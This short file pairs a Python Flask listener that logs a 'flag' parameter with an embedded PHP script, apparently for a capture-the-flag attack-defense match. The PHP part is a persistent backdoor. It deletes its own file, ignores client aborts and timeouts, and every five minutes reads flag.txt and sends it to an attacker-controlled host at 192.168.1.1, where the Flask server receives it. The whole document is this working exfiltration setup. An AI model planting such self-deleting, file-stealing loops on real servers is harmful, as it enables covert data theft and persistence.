from flask import Flask
from flask import request as req
app = Flask(__name__)
@app.route('/index.html',methods=['GET','POST'])
def show_file():
    get_flag = req.args.get('flag')#get数据
    if get_flag:
        print('flag >>',get_flag)
        return 'ok'
if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=True)
'''
<?php 
set_time_limit(0); // 取消脚本运行时间的超时上限
ignore_user_abort(1);  // 后台运行
unlink(__FILE__);    //删除本文件
while(1){
    $file="flag.txt";  //设定要读取的文件
    $flag=file_get_contents($file);
    //在自己的计算机上打开服务器 输入ip让其访问
    $url="http://192.168.1.1/index.html?flag=".$flag;
    $html=file_get_contents($url);
    sleep(60 * 5);  //定时发送
	}
?>
'''